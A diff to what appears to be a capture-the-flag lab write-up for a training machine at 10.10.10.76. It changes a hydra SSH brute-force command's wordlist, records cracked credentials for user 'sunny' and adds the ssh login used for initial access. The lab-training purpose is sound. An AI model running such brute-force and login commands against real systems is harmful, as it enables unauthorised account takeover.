@@ -58,8 +58,17 @@ Port 22022: OpenSSH 8.4
 + SSH is open, and there are 2 valid usernames: sammy adn sunny
 + Brute force the users' credentials using hydra.
 ```
-hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt 10.10.10.76 ssh -s 22022 -f
+hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022 -f
 ```
+
++ `sunny`:`sunday` username and password found.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3056ebf9-733d-4644-a26c-b91a787cab77)
+
++ Login ssh: `ssh -p 22022 sunny@10.10.10.76`
++ We got the low level access.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/75521922-5eea-4e98-8c9a-b44f26b5bd71)
 
 
 ## Privilege Escalation:
